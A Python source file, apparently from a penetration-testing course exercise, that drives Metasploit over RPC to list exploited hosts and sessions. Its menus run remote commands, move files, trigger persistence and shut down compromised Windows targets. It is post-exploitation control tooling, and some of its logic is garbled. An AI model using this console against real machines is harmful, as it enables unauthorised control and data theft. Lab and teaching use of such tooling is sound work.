import os
import time
import pandas

from common.utils import cwd, clear_terminal, printd, create_header
from pymetasploit3.msfrpc import MsfRpcClient
# supress pandas deprecation warning
import warnings

from src import exploit

warnings.filterwarnings("ignore", category=FutureWarning)


def build_table(client, hosts, vulns, sessions):

    # get all hosts

    # printd(sessions)
    # get all hosts from hosts.csv
    # clear_terminal()
    exploited_hosts = pandas.DataFrame(columns=['Session ID', 'IP', 'OS', "shell", 'Exploit', 'Status'])
    hosts_real = pandas.read_csv(os.path.join(cwd, '../hosts.csv'), index_col=0, header=0)
    # printd(hosts_real.index.tolist())
    # remove hosts that are not in hosts.csv

    # remove hosts from db that are not in hosts.csv
    for host in hosts:
        if host['address'] not in hosts_real.index.tolist():
            client.db.workspaces.workspace('default').hosts.delete(address=host['address'])
    hosts = client.db.workspaces.workspace('default').hosts.list

    # for sid, session in sessions.items():
    #     if session['tunnel_peer'] not in hosts_real.index.tolist():
    #         client.sessions.session(str(sid)).stop()
    sessions = client.sessions.list
    # for sid, session in sessions.items():
    #     exploited_hosts = exploited_hosts.append({
    #         'IP': session['session_host'],
    #         'Session ID': sid,
    #                                                 'OS': "Unknown",
    #                                                 'shell': session['type'],
    #                                                 'Exploit': session['via_exploit'],
    #                                                 'Status': 'Active' if session['tunnel_peer']  in hosts_real.index.tolist() else "Closed"},
    #                                                 ignore_index=True)
    if sessions:
        for sid, session in sessions.items():
            sid = str(sid)
            if sid not in exploited_hosts.index.tolist():
                exploited_hosts = exploited_hosts.append({
                    'IP': session['session_host'],
                    'Session ID': sid,
                    'OS': "Unknown",
                    'shell': session['type'],
                    'Exploit': session['via_exploit'],
                    'Status': 'Active' if session['tunnel_peer'] in hosts_real.index.tolist() else "Closed"},
                    ignore_index=True)
            else:
                exploited_hosts.loc[exploited_hosts['Session ID'] == str(sid), 'Status'] = 'Active' if session['tunnel_peer'] in hosts_real.index.tolist() else "Offline"
    # match hosts from hosts with sessions
    print()
    for host in hosts:
        if host['address'] in exploited_hosts['IP'].tolist():
            exploited_hosts.loc[exploited_hosts['IP'] == host['address'], 'OS'] = host['address']
        else:
            exploited_hosts = exploited_hosts.append({
                'IP': host['address'],
                'Session ID': "None",
                'OS': host['os_name'],
                'shell': "None",
                'Exploit': "None",
                'Status': 'Open' if host['state'] == 'alive' else "Closed"},
                ignore_index=True)

        # add each session to the exploited_hosts dataframe
    # if exploit for host is empty, find the host in the vulns dataframe and add the exploit name
    for vuln in vulns:
        if vuln['host'] in exploited_hosts['IP'].tolist():
            if exploited_hosts.loc[exploited_hosts['IP'] == vuln['host'], 'Exploit'].values[0] == 'None':
                exploited_hosts.loc[exploited_hosts['IP'] == vuln['host'], 'Exploit'] = vuln['name']
        else:
            exploited_hosts = exploited_hosts.append({
                'IP': vuln['host'],
                'Session ID': "None",
                'OS': "Unknown",
                'shell': "None",
                'Exploit': vuln['name'],
                'Status': "Active" if vuln['host'] in hosts_real.index.tolist() else "Closed"},
                ignore_index=True)
    # get all hosts with sessions
    # multiple sessions can be open on one host
    # but only one session can be open on one port

        # set session id as index
    # if session id is in the exploited_hosts dataframe, set it as the index
    if sessions:
        if exploited_hosts.index.name != "Session ID":
            exploited_hosts = exploited_hosts.set_index('Session ID')
    else:
        exploited_hosts = exploited_hosts.set_index('IP')

    # exploited_hosts.set_index('Session ID', inplace=True)
    # pretty printd table
    return exploited_hosts

def start_page(client, hosts, vulns, sessions):
    clear_terminal()
    printd(create_header("INTERACT WITH EXPLOITED HOSTS"))
    printd(build_table(client, hosts, vulns, sessions))

def main(client: MsfRpcClient):
    """
    interact with exploited hosts:
    - Make your exploitation persistent.
        o You should show this as part of the next task (Task 11). E.g., You shut down one of theWindows 7 targets and the target disappears from the list of the exploited machines. Oncethe target is started again, the target is again shown on the list and shown as online (forexample)
    - List all the exploited hosts, whether they are online or offline, the type of exploit used etc
    - Provide an easy to use interface to control multiple instances.
        o E.g., provide an interface to send a command to one or all targets at once
            ▪ E.g., Shut down the targets
            ▪ E.g., Download/upload a file

    :param
    :param client:
    :return:
    """
    # get all hosts


    hosts = client.db.workspaces.workspace('default').hosts.list
    vulns = client.db.workspaces.workspace('default').vulns.list
    sessions = client.sessions.list
    clear_terminal()
    printd(create_header("INTERACT WITH EXPLOITED HOSTS"))
    printd(build_table(client, hosts, vulns, sessions))


    go_back = False
    while not go_back:
        try:
            clear_terminal()
            printd("1. ALL EXPLOITED HOSTS", header=True)
            printd(build_table(client, hosts, vulns, sessions))
            # show options if session id is the index of the dataframe
            if sessions:
                printd('1. Select host')
            printd('2. Go back')
            choice = input('Enter your choice: ')

            if choice == '1' and sessions:
                while not go_back:
                    clear_terminal()
                    printd("2. SESSIONS", header=True)
                    printd(build_table(client, hosts, vulns, sessions))
                    sids = []
                    sid = input('Enter session id (or multiple separated by spaces: ')
                    for s in sid.split(' '):
                        if s in sessions.keys():
                            sids.append(s)
                    if sid in sessions.keys():
                        s = client.sessions.session(sid)
                        session_type = sessions[sid]['type']
                        while not go_back:
                            clear_terminal()
                            print(s.info)

                            printd(f"REMOTE {session_type} shell running on {sessions[sid]['session_host']}",header=True)
                            printd(build_table(client,hosts, vulns, sessions))
                            printd('1. Download File')
                            printd('2. Upload File')
                            printd('3. Run Command')
                            printd('4. Shut Down')
                            printd('5. Delete Session')
                            printd('6. Go Back')
                            choice = input('Enter your choice: ')
                            if choice in ['1', '2', '3']:
                                # run command, download file, upload file


                                prefix = '{}({}) {}>  '
                                while not go_back:
                                    for sid in sids:
                                    # if s['type'] == 'shell':
                                    #     s = s.upgrade()
                                        session_type = sessions[sid]['type']

                                        if session_type == 'meterpreter':
                                            if choice in ['1', '2']:
                                                local_path = input(f'{prefix} Local path: ')

                                                command = 'download ' if choice == '1' else 'upload ' + input(prefix.format(session_type, sid, "REMOTE")) + " " + input(prefix.format(session_type, sid, "LOCAL")) if choice == '2' else ""
                                                go_back = True
                                            else:
                                                command = input(prefix.format(session_type, sid, ""))
                                        elif session_type == 'shell':
                                            command = input(prefix.format(session_type, sid, ""))
                                        else:
                                            command = input(prefix.format(session_type, sid, ""))
                                        if command == 'exit':
                                            go_back = True
                                            break
                                        else:
                                            try:
                                                out = s.get_writeable_dir()
                                                time.sleep(1)
                                                print(out)
                                                out = ''
                                                while len(out) == 0:
                                                    time.sleep(1)
                                                    out = s.read()
                                            except Exception as e:
                                                print(e)
                                                go_back = True
                                                break

                                go_back = False
                            elif choice == '4':
                                # shut down
                                exploit.persist(client, sids)
                                s.run_psh_cmd('shutdown /s', timeout=10, )
                                time.sleep(1)
                                out = ''
                                # while len(out) == 0:
                                #     time.sleep(1)
                                #     out = s.read()
                                # printd(build_table(client, exploited_hosts, hosts, vulns, sessions))
                                break
                            elif choice == '5':
                                # delete session
                                s.stop()
                                break
                            elif choice == '6':
                                # go back
                                break
                            elif choice.lower() == 'exit':
                                return build_table(client, hosts, vulns, sessions)
                            else:
                                printd('Invalid choice')
                                break
                    elif choice.lower() == 'exit':
                        return build_table(client, hosts, vulns, sessions)
                    else:
                        break
            elif choice == '2':
                go_back = True
            elif choice.lower() == 'exit':
                return build_table(client, hosts, vulns, sessions)
            else:
                printd('Invalid choice')

        except Exception as e:
            return f"Error ({type(e)}): {e}"
        else:
            return build_table(client, hosts, vulns, sessions)
